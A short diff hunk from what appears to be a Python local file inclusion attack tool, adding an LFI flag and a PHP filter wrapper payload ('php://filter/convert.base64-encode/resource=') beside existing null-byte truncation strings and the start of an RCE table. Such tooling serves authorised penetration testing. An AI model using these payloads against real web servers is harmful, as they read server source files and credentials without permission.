@@ -52,6 +52,11 @@ payloadlist = generatePayloads()
 
 nullchars = ['%00', '%2500', '%25%30%30', '%u0000', '%c0%80', '%e0%80']
 
+lfi = False
+phase1_wrappers = [
+    "php://filter/convert.base64-encode/resource=",
+]
+
 wrapperCount = 4
 
 rce = {
